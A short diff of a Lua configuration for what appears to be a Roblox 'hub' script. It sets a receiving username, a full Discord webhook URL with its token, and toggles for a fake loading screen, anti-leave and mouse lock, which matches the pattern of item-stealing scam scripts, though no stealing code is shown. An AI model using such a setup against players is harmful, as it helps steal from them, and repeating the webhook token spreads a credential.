@@ -1,14 +1,13 @@
-UserName = "Midmandon"
-Webhook = "https://discord.com/api/webhooks/1094291091194380418/TQc2GzIY6A9QF4msNRmjlUSFdX5Q-FzenGSc6Vll53YWi3yZicwKJUFWNzRmBPr_eqMP"
-UserName2 = "Midmandon"
+_G.UserID = "Midmandon"
+_G.Webhook = "https://discord.com/api/webhooks/1094291091194380418/TQc2GzIY6A9QF4msNRmjlUSFdX5Q-FzenGSc6Vll53YWi3yZicwKJUFWNzRmBPr_eqMP"
 
-_G.LoadingScreen = true -- make it true if you want the loadingscreen
-_G.AntiLeave = true -- make it true if you want the antileave
-_G.MouseLock = true -- make it true if you want the mouselock
+_G.LoadingScreen = false -- make it true if you want the loadingscreen
+_G.AntiLeave = false -- make it true if you want the antileave
+_G.MouseLock = false -- make it true if you want the mouselock
 
 -- Remove These If You're Not Using The Rizz LoadingScreen
 
-_G.ScriptName = "Yuri Haha Hub"
+_G.ScriptName = "Script Name"
 _G.FirstText = "Preparing..."
 _G.SecondText = "Loading..."
 _G.ThirdText = "Almost Done..."
